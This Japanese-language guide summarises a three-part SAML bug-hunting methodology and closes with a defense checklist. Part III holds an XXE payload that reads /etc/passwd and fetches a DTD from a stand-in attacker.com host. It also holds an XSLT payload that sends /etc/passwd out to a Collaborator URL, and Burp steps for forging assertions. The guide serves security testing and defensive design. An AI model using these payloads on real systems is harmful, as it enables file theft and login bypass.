## epi052 SAMLハンティング方法論3部作

epi052 氏（Ben Risher）が2019年3月に3回に分けて公開した「How to Hunt Bugs in SAML; a Methodology」は、SAML（Security Assertion Markup Language：XMLベースのシングルサインオン規格）の脆弱性を「思いつきで叩く」のではなく、プロトコルの内部構造を理解したうえで系統立てて検証するための地図を与えてくれる古典的な3部作である。第1部で SAML のデータフローと XML 署名の仕組みを分解し、第2部で Burp Suite 拡張「SAML Raider」と XML 署名ラッピング（XSW）を、第3部で XXE・XSLT・トークン受信者混同（Recipient Confusion）など残りの攻撃手法を、いずれも「なぜ通るのか」の原理とともに提示する構成になっている。

本節はあくまで**防御・検証設計を理解する目的**で書く。実在サービスや本番環境への無許可の検証、破壊的手順は扱わない。攻撃手法は「どこの実装がどう間違えると成立するか」を知り、堅牢なバリデーションを設計するための知識として読んでほしい。

なお第3部の原記事自体は詳細なペイロードをほとんど載せず、7ステップの方法論インデックスと外部資料へのリンク、そして RelayState の応用例（後述）に絞った短い記事である。そのため本節では、3部作全体で提示される具体ペイロードを技法ごとに整理して示し、原典で明示されない補足には一般知識に基づく旨を明記する。

---

### Part I：SAMLの基礎と攻撃面の地図

> 出典: How to Hunt Bugs in SAML - Part I — https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/

#### 登場人物と用語

SAML は OASIS（Organization for the Advancement of Structured Information Standards）が策定した XMLベースの認証・認可情報の受け渡し規格で、複数アプリ間の SSO（シングルサインオン）に使われる。攻撃面を語る前に3つの主役を押さえる。

- **IdP（Identity Provider：認証を実行し Assertion を発行する側）**。ユーザーが本人か否かを判定し、その結果に署名して発行する。企業の Okta / Azure AD / OneLogin などがこれにあたる。
- **SP（Service Provider：ユーザーが使いたいWebアプリ）**。IdP が発行した Assertion を受け取り、検証して、セッションを張る。
- **Assertion（アサーション：ユーザーの身元や属性を記述したXMLメッセージ）**。「このユーザーは alice で、管理者ロールを持ち、この時刻まで有効」といった主張（=assert）が中身。SAML 攻撃の本質は、この Assertion を攻撃者が書き換えても SP が受け入れてしまう欠陥を突くことにある。

#### SP起点フロー（SP-Initiated SSO）の8ステップ

epi052 は Web Browser SSO Profile の標準的な流れを8段階に分解する。攻撃者がどこに介入できるかを見るための下地になる。

1. ユーザーが SP の保護リソースを要求する。
2. 未認証なので SP が **SAML Request** を生成する。
3. SP がユーザーのブラウザを IdP へリダイレクトし、SAML Request を渡す。
4. IdP がリクエストを受け、ユーザーを認証する（パスワード入力など）。
5. IdP が署名付き Assertion を含む **SAML Response** を生成する。
6. IdP がユーザーを SP の **ACS（Assertion Consumer Service）URL** へリダイレクトし、Response を渡す。
7. ACS が SAML Response を検証する。
8. 検証に通ればユーザーは保護リソースへアクセスできる。

ここで決定的に重要なのは、**SAML Response がユーザーのブラウザを経由して SP に届く**点である（バックチャネルではなくフロントチャネル）。つまり攻撃者は自分のブラウザとプロキシで Response を傍受・改ざんできる立場にある。SAML のセキュリティは「SP が署名検証を厳密に行う」という一点にすべてを賭けており、そこが崩れると Assertion の改ざんが素通りする。これが3部作全体を貫く前提だ。

#### SAML Request の構造

SAML Request の主要属性は次のとおり。検証時に注目すべき「改ざんの起点」でもある。

- **AssertionConsumerServiceURL**：認証後に IdP が SAML Response を返送する先。ここを攻撃者のURLに書き換えられれば、Assertion を攻撃者に横取りさせられる余地が生まれる（IdP 側で登録済みURLと照合していなければ成立）。
- **Destination**：宛先 IdP のアドレス。
- **ProtocolBinding**：SAML メッセージをどの方式（HTTP-Redirect / HTTP-POST など）で運ぶかを定義する。
- **Issuer**：リクエストを生成したエンティティ（=SP）の識別子。

SAML Request は **Deflate 圧縮 → base64 エンコード**という順で（HTTP-Redirect バインディングの場合）変換されて送られる。検証時はこの逆順（base64デコード → inflate）で復元してから中身を見る必要がある。この「圧縮＋エンコード」という一手間が、後述の XXE 挿入ポイントを一見わかりにくくしている。

#### SAML Response の構造

SAML Response の骨格は次のようなXMLツリーである。攻撃対象を語る共通言語になるので構造を頭に入れておく。

```xml
<samlp:Response>
  <saml:Issuer/>
  <ds:Signature/>
  <samlp:Status/>
  <saml:Assertion>
    <saml:Subject/>
    <saml:Conditions/>
    <saml:AuthnStatement/>
    <saml:AttributeStatement/>
  </saml:Assertion>
</samlp:Response>
```

各要素の役割と、なぜ攻撃上重要かは以下のとおり。

- **`<ds:Signature>`**：XML署名。Assertion（あるいは Response 全体）の完全性を保護し、発行者が IdP であることを認証する。**この要素をどう扱うかが全攻撃の急所**。
- **`<saml:Conditions>`**：Assertion の有効時刻（`NotBefore` / `NotOnOrAfter`）や、この Assertion が特定 SP 宛て（`AudienceRestriction`）であることを規定する。ここの検証漏れがリプレイや受信者混同を許す。
- **`<saml:NameID>`**（Subject 配下）：認証されたユーザーの識別子。攻撃者が最も書き換えたい値。ここを `admin` に変えて通れば権限昇格になる。
- **`InResponseTo`**：元の SAML Request の ID を参照し、対応関係を検証するための値。検証漏れは Response の使い回し（未要求 Response の注入）を許す。

#### XML署名の3タイプと Reference URI

SAML の署名は W3C の XML Signature 規格に従い、大きく3つの形態がある。ここを理解しないと XSW（後述）の原理が腑に落ちない。

- **Enveloped（内包型）署名**：署名が「署名対象の要素の内側」に入れ子で置かれる。SAML で最も一般的。
- **Enveloping（外包型）署名**：署名が署名対象リソースを包み込む。
- **Detached（分離型）署名**：署名が署名対象と別の場所にある。

署名がどの要素を保護しているかは、`<ds:Reference>` 要素の `URI` 属性が指し示す。例：

```xml
<ds:Reference URI="#_2af3ff4a06aa82058f0eaa8ae7866541">
  <ds:Transform Algorithm="http://www.w3.org/2000/09/xmldsig#enveloped-signature"/>
</ds:Reference>
```

`URI="#_2af3ff..."` は「ID属性が `_2af3ff...` の要素を署名対象とする」という意味だ。**署名検証は URI が指す要素のハッシュを検算するだけ**であり、「アプリのロジックが実際に読み込む要素」と「署名が保護している要素」が一致している保証はない。この“署名が指す要素”と“処理される要素”のズレこそ XSW の温床になる（Part II で詳述）。`<ds:Transform>` は、ハッシュ計算前に対象XMLへ適用する変換を指定するもので、`enveloped-signature` 変換は「署名要素自身をハッシュ計算対象から除外する」ためのもの。この Transform の仕組みが XSLT インジェクション（Part III）で悪用される。

#### SPが検証すべきポイント（=検証漏れの候補）

epi052 が挙げる、SP が本来必ず行うべき検証は次のとおり。裏を返せば、ここのどれかが欠けていれば脆弱性になる。

- IdP の証明書を使った署名の真正性検証。
- Assertion の時刻条件（`NotBefore` / `NotOnOrAfter`）。
- `AudienceRestriction` が自SPと一致するか。
- `InResponseTo` が自分が出した Request の ID と一致するか。
- `Recipient` が自分の ACS URL と一致するか。

#### RelayState と、検証に使うツール

**RelayState** は、SP が IdP に渡す状態情報で、「最初に誰がどのリソースを要求したか」を SAML Response 帰還時に SP が思い出すためのもの。SAML Response には同じ RelayState 値が含まれていなければならない。SP はこの値を認証後のリダイレクト先などに使うことが多く、これがオープンリダイレクトやインジェクションの入口になり得る（Part III の応用例で再登場する）。

Part I で紹介される検証ツールは2つ。**OneLogin の SAML ツール群**（エンコード/デコード・暗号化/復号のユーティリティ）と、Part II の主役になる Burp Suite 拡張 **SAML Raider** である。

---

### Part II：SAML RaiderとXML署名ラッピング（XSW）

> 出典: How to Hunt Bugs in SAML - Part II — https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/

#### SAML Raider とは

**SAML Raider** は Roland Bischofberger と Emanuel Duss が開発した Burp Suite 拡張で、(1) SAML メッセージの改ざんと (2) X.509 証明書の管理、という2つの中核機能を提供する。Burp の Extender タブ → BApp Store からインストールでき、導入すると「SAML Raider Certificates」タブが追加され、Repeater が拡張される。SAML の面倒な「base64デコード → inflate → XML編集 → deflate → base64エンコード → 署名再計算」という往復作業を GUI 上で一括処理してくれるのが価値だ。

#### X.509 証明書マネージャ

証明書マネージャでは、証明書のインポート/エクスポート、秘密鍵管理、**証明書のクローン**（Modulus と Signature 以外の全フィールドを保持して複製）、任意改変しての自己署名、証明書情報の表示ができる。検証用の証明書はワンライナーで作れる。

```bash
openssl req -x509 -newkey rsa:4096 -keyout /tmp/key.pem -out /tmp/cert.pem -days 365 -nodes
```

クローン証明書が元と同等の見た目になっているかは diff で確認できる。

```bash
diff <(openssl x509 -in /tmp/cloned-cert.pem -text -noout) <(openssl x509 -in /tmp/cert.pem -text -noout)
```

なぜ「クローン」機能が要るのか。SP が Assertion の証明書（`<ds:KeyInfo>` 内）を見て信頼判定するとき、フィンガープリントではなく Subject や発行者名といった**表面的なフィールドだけを見て**信頼してしまう実装が存在する。その場合、見た目が本物そっくりで鍵だけ攻撃者のものにすげ替えた証明書で署名し直せば通ってしまう。クローン機能はこの検証（証明書偽装、後述）を効率化するためにある。

#### XSW（XML Signature Wrapping：XML署名ラッピング）の原理

XSW は SAML 攻撃の花形であり、**署名検証モジュールと XMLパーサ（アプリのロジック）が“別々の要素”を見てしまう齟齬**を突く。

原理を分解するとこうなる。署名検証ステップは前述のとおり `<ds:Reference>` の `URI` 属性を辿って「署名された本物の要素」を特定し、そのハッシュを検算する。一方、アプリのビジネスロジック側の XMLパーサは、標準的なツリー探索（多くは上から順、あるいは「最初に見つかった Assertion」）で要素を取り出す。**この2つの探索経路が同じ要素に着地する保証がない**。

そこで攻撃者は、正規の（署名済み）Assertion をそのまま残しつつ、値を書き換えた**偽の Assertion のコピー**を XML の別の場所に挿入する。すると、

- 署名検証は URI が指す「正規の署名済み要素」を見つけて「署名OK」と判定し、
- アプリロジックは探索順の都合で「偽の Assertion」を読み込んで、その `NameID` やロールを信用する。

結果、署名を一切壊さずに Assertion の中身をすり替えられる。どこにコピーを置き、どちらを署名対象／処理対象にするかの配置パターンが、後述の8バリエーションだ。

標準的な SAML Response の骨格（配置の基準になる）：

```xml
<?xml version="1.0" encoding="UTF-8"?>
<samlp:Response ID="_df55c0bb940c687810b436395cf81760bb2e6a92f2" ...>
  <saml:Issuer>...</saml:Issuer>
  <ds:Signature>
    <ds:SignedInfo>
      <ds:Reference URI="#_df55c0bb940c687810b436395cf81760bb2e6a92f2">...</ds:Reference>
    </ds:SignedInfo>
    <ds:SignatureValue>...</ds:SignatureValue>
    <ds:KeyInfo>...</ds:KeyInfo>
  </ds:Signature>
  <saml:Assertion>
    <saml:Subject>
      <saml:NameID>...</saml:NameID>
      <saml:SubjectConfirmationData/>
    </saml:Subject>
    <saml:AttributeStatement>...</saml:AttributeStatement>
  </saml:Assertion>
</samlp:Response>
```

#### 8種類のXSWバリエーション

SAML Raider は次の8パターンを自動生成できる（この分類は Somorovsky らの2012年 USENIX 論文「On Breaking SAML: Be Whoever You Want to Be」に由来する）。前半（#1–#2）は Response 全体を、後半（#3–#8）は Assertion を対象とする点が大きな違いだ。

- **XSW #1**：Response 要素まるごとを **enveloping署名**付きでコピーし、コピーを本物の前に置く。パーサが本物を検証する代わりに未署名コピーを処理してしまうことを狙う。
- **XSW #2**：#1 とほぼ同じ配置だが、enveloping ではなく **detached署名**を使う。
- **XSW #3**：Assertion をラップする。コピーを root（Response）の**最初の子**として挿入し、本物を兄弟要素にする。「最初に見つかった Assertion を使う」実装に効く。
- **XSW #4**：#3 と似るが、本物の Assertion を**コピーされた Assertion の子要素**として入れ子にする（兄弟ではなく親子関係）。
- **XSW #5**：コピーされた Assertion が **Signature 要素自身を内包**する、非標準の署名構成を作る。
- **XSW #6**：コピーされた Assertion が **Signature と本物の Assertion の両方**を入れ子で内包する。
- **XSW #7**：コピーした Assertion を **Extensions 要素の中**に挿入する。Extensions はスキーマ制約が緩いため、OpenSAML のような**スキーマ検証で防御しているライブラリ**でも、非標準要素の緩いパースを突いてバイパスできる。
- **XSW #8**：#7 の変形で、コピーではなく**本物の Assertion を Extensions 要素に入れる**ことで、同じくスキーマ検証を回避する。

#7・#8 が「なぜ効くのか」は特に重要だ。素朴な XSW（#1–#6）はスキーマ検証（DTD/XSDでツリー構造を厳格化する対策）で弾ける。しかし Extensions 要素は仕様上「任意の拡張要素を置いてよい」領域なので、そこに Assertion を隠すと、スキーマ検証を通過しつつパーサに拾わせることができる。対策の抜け穴を、仕様が公式に用意した“緩い場所”で突く発想である。

#### XSW攻撃の実行手順（Burp）

セットアップ：

1. Proxy → Options で、`SAMLResponse` パラメータを含むリクエストにマッチする Intercept ルールを作る（該当トラフィックだけ効率的に捕捉するため）。
2. SAML Response を Burp Proxy で捕捉する。
3. Repeater へ送る（Ctrl+R）。
4. Repeater の SAML Raider タブを開く。

実行：

- XSW のドロップダウンから攻撃タイプ（#1〜#8）を選ぶ。
- 「Go」で改ざん済み Response を送信する。
- **複数パターンを試すときは毎回オリジナルの Request を再送**し、前回の改変の残りを消してから次を試す（残留改変による誤判定を避けるため）。
- ユーザー属性（識別子など）を書き換えて、権限昇格やなりすましが成立するか観測する。

#### 署名除外（Signature Exclusion）

XSW の前に必ず試すべき最も基本的な検証。**署名検証が必須になっているか**を確かめる。`<ds:Signature>` 要素をすべて削除し、それでも Assertion が受理されるなら、その実装は「署名が無ければ検証をスキップする」欠陥を抱えている。

手順：

1. SAML Response を傍受する。
2. SAML Raider の「Remove Signatures」ボタンを押す。
3. 属性（ユーザーID、ロール等）を書き換える。
4. 転送する。

これが通る根本原因は、署名検証を「署名要素が存在したら検証する」という条件分岐で実装してしまうこと。署名が無い＝検証すべきものが無い、と解釈して素通しになる。正しくは「署名の**存在を必須**とし、無ければ拒否」でなければならない。

---

### Part III：XXE / XSLT / 証明書偽装 / リプレイ / 受信者混同 / RelayState

> 出典: How to Hunt Bugs in SAML - Part III — https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/

第3部の原記事は、詳細ペイロードを列挙するというより「7ステップの方法論インデックス」＋「RelayState の応用例」＋「チェックリストより創造性が要る」というメッセージに絞られている。以下では各技法の具体を、3部作全体の内容として整理して示す（原記事に明示されないコード例には一般知識に基づく補足である旨を付す）。原記事が掲げる7ステップは次のとおり。

1. Signature Exclusion（署名除外：署名なし Assertion を受理するか）
2. XML Signature Wrapping（XSW：ラッピング耐性）
3. Certificate Faking（証明書偽装：IdP 検証の有無）
4. Assertion Replay（アサーション再送：複数セッション生成の可否）
5. XXE Testing（XML外部実体の露出）
6. XSLT Testing（XSL変換のリスク）
7. Token Recipient Confusion（共有IdP環境でのSP横断受理）

#### 証明書偽装（Certificate Faking）

SP が「信頼する IdP が署名したか」を、証明書の妥当性まで含めて検証しているかを試す。自己署名証明書で署名し直しても通るなら、SP は発行者証明書の検証をしていない。

手順（SAML Raider）：

1. 署名付き SAML Response を傍受する。
2. 「Send Certificate to SAML Raider Certs」で証明書を取り込む。
3. Certificates タブで取り込んだ証明書を選び「Save and Self-Sign」。
4. Proxy タブに戻る。
5. ドロップダウンから自己署名証明書を選ぶ。
6. 「Remove Signatures」。
7. 「(Re-)Sign Message」または「(Re-)Sign Assertion」。
8. 改ざん済み Response を転送する。

成功する原因は、SP が `<ds:KeyInfo>` に添付された証明書を**そのまま信頼して署名検証に使う**（＝「メッセージに同梱された鍵で検証が通ればOK」）実装にある。正しくは、事前に IdP メタデータで固定した証明書（またはそのフィンガープリント）だけを信頼し、メッセージ同梱の証明書は無視すべきだ。同梱の鍵で検証すれば、攻撃者が自作の鍵ペアで署名して自作の証明書を添えるだけで常に「検証成功」になる。

#### アサーション再送（Assertion Replay）

同一の（正規に署名された）Assertion を2回以上送って、複数セッションが張れるかを見る。`InResponseTo` や、`NotOnOrAfter` による使い捨て化、一度使った Assertion ID の記録（ワンタイム保証）が無いと成立する。SP は消費済み Assertion の ID を一定期間キャッシュし、再送を拒否しなければならない。

#### XXE（XML External Entity）注入

SAML Response は「deflate 圧縮 → base64」の XML 文書である。したがって XML 宣言直後に **DOCTYPE / 外部実体宣言**を差し込める。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY file SYSTEM "file:///etc/passwd">
  <!ENTITY dtd SYSTEM "http://www.attacker.com/text.dtd">
]>
<samlp:Response ...>
  <!-- 以降は通常のSAML構造 -->
</samlp:Response>
```

なぜ通るのか。SP が Response を処理する際の XMLパーサが**外部実体の解決を有効**にしていると、`&file;` の参照や外部 DTD 取得の時点で、署名検証より前にパーサがファイルを読み、外部 URL を取りに行ってしまう。ポイントは**署名検証の前段でパースが走る**こと。したがって署名が無くても（あるいは XSW を併用しなくても）成立する。

検証（帯域外＝アウトオブバンド）手順：

1. Burp Collaborator の URL を用意する（データ持ち出しの受け皿）。
2. XML 文書冒頭に XXE ペイロードを挿入する。
3. SP へ転送する。
4. Collaborator に DNS 問い合わせや HTTP コールバックが来ないか（おおむね60秒以内）を監視する。

コールバックが来れば XXE 脆弱性が確認できる。`/etc/passwd` の直接反射が返らなくても、外部 DTD を使ったブラインド exfiltration（外部 DTD 内でパラメータ実体を組み立てて Collaborator へ送る手口）で内容を抜ける場合がある点が「なぜ帯域外か」の理由だ。防御は**DTD 処理と外部実体解決の完全無効化**（パーサを FEATURE_SECURE_PROCESSING 等で堅牢化）に尽きる。

#### XSLT インジェクション

XSLT（Extensible Stylesheet Language Transformation：XMLを別形式へ変換する言語）は**チューリング完全**であり、`<ds:Transform>` に変換として XSLT を仕込める。しかも**署名検証の前に Transform が実行される**ため、有効な署名がなくても発火する。これが XSLT 攻撃の核心だ。

ペイロード例：

```xml
<ds:Transform>
  <xsl:stylesheet xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
    <xsl:template match="doc">
      <xsl:variable name="file" select="unparsed-text('/etc/passwd')"/>
      <xsl:variable name="escaped" select="encode-for-uri($file)"/>
      <xsl:variable name="attackerUrl" select="'http://1qsg2yhdfz4np3uerviimk3hk8qyen.burpcollaborator.net/'"/>
      <xsl:variable name="exploitUrl" select="concat($attackerUrl,$escaped)"/>
      <xsl:value-of select="unparsed-text($exploitUrl)"/>
    </xsl:template>
  </xsl:stylesheet>
</ds:Transform>
```

このペイロードは、`unparsed-text()` で `/etc/passwd` を読み、`encode-for-uri()` でURLエンコードし、攻撃者の Collaborator URL に連結して、再び `unparsed-text()` でその URL を「取得」することでファイル内容を帯域外送出する。`<ds:Transform>` を格納する `<ds:Transforms>` の位置：

```xml
<ds:Signature xmlns:ds="http://www.w3.org/2000/09/xmldsig#">
  <ds:Transforms>
    <!-- ここに上記ペイロードを挿入 -->
  </ds:Transforms>
</ds:Signature>
```

なぜ署名前に走るのか。XML 署名の仕様上、ハッシュ計算の対象を作るために「Transform を順に適用してから正規化しダイジェストを取る」段取りになっている。つまり Transform の実行は**ダイジェスト検証の準備工程**であり、検証成否を出す前に完了している。ここに任意 XSLT を差し込めば、署名が正しいかどうかに関係なくコードが走る。防御は、署名検証に使う XSLT/Transform エンジンで危険な拡張関数（`unparsed-text` / `document()` 等の外部アクセス）を無効化するか、そもそもカスタム Transform を禁止することだ。

#### トークン受信者混同（SAML-TRC：Token Recipient Confusion）

`<saml:SubjectConfirmationData>` の **Recipient 属性**（Assertion の意図された配送先）の検証不備を突く。ある SP 宛ての Assertion を、同じ IdP を共有する別 SP に流用できてしまう欠陥だ。

前提条件：

- 攻撃者が **SP-Legit**（攻撃者が正規に持つアカウント）を保有している。
- **SP-Target** が SP-Legit と**同一の IdP** を共有している。
- 両 SP が同じ IdP のトークンを受理する。

攻撃：

1. 共有 IdP 経由で SP-Legit に認証する。
2. SP-Legit 宛ての SAML Response を傍受する。
3. 同じ Response を SP-Target へ転送する。
4. SP-Target が Recipient を検証していなければ、SP-Legit のユーザーとして SP-Target にアクセスできる。

成功すれば、攻撃者の SP-Legit 資格で SP-Target に入れてしまう。根本原因は、SP が「署名が正しい（＝正規 IdP が発行した）」ことだけを確認し、「**この Assertion は本当に自分（この SP）宛てか**」（Recipient / AudienceRestriction / Destination の一致）を確認しないこと。マルチテナントや共有 IdP 環境で特に危険で、SP は必ず自分の ACS URL・エンティティ ID と一致するかを検証しなければならない。

#### RelayState と「チェックリストを超える創造性」

第3部の締めくくりとして epi052 が強調するのは、**RelayState の応用例**だ。RelayState は SP が認証後の遷移先を思い出すために使う値で、SP がこれを検証せずリダイレクト先に使うと**オープンリダイレクト**になり得る（原記事は Rick Osgood のブログを引く）。これは SAML の“コア攻撃面”ではなく周辺パラメータだが、だからこそ見落とされやすい。

原記事のメッセージは明快だ。方法論は**厳格なチェックリストと混同すべきでない**。既存手法に変化を加える創造性こそがバグ発見の鍵であり、RelayState のように「SAML本体ではない付随パラメータ」にも攻撃面は広がっている、という視点で臨むべきだ。

---

### 防御まとめ（この3部作から読み取るべき設計原則）

攻撃の裏返しとして、堅牢な SP 実装が満たすべき要件を整理する。

- **署名の存在を必須化**する。署名が無い Response/Assertion は即拒否（Signature Exclusion 対策）。
- **署名対象と処理対象を一致させる**。「署名済みの要素だけをアプリロジックに渡す」設計にし、`ID` の重複や `Reference URI` と実処理要素の乖離を検出する。スキーマ検証を有効にしつつ、Extensions を悪用する XSW #7/#8 も想定する（XSW 対策）。
- **信頼する証明書を事前固定**する。メッセージ同梱の `<ds:KeyInfo>` 証明書を信頼せず、IdP メタデータで固定した鍵・フィンガープリントでのみ検証する（証明書偽装対策）。
- **Assertion をワンタイム化**する。ID をキャッシュして再送を拒否し、`NotBefore`/`NotOnOrAfter` を厳格に評価する（リプレイ対策）。
- **XMLパーサを堅牢化**する。DTD・外部実体解決を無効化し、カスタム Transform／危険な XSLT 拡張関数を禁止する（XXE / XSLT 対策）。
- **宛先を必ず検証**する。`Recipient`・`AudienceRestriction`・`Destination`・`InResponseTo` を自 SP の値と厳密照合する（受信者混同・未要求 Response 対策）。
- **RelayState を検証**する。リダイレクト先に使う場合は許可リストで制限する（オープンリダイレクト対策）。

これらはいずれも「署名が通った＝安全」という素朴な思い込みを排し、**署名の対象・発行者・宛先・鮮度**を独立に検証するという一点に集約される。SAML の脆弱性の大半は、この4観点のどれかを省いた実装から生まれている。

> 出典（3部作）:
> - Part I — https://epi052.gitlab.io/notes-to-self/blog/2019-03-07-how-to-test-saml-a-methodology/
> - Part II — https://epi052.gitlab.io/notes-to-self/blog/2019-03-13-how-to-test-saml-a-methodology-part-two/
> - Part III — https://epi052.gitlab.io/notes-to-self/blog/2019-03-16-how-to-test-saml-a-methodology-part-three/
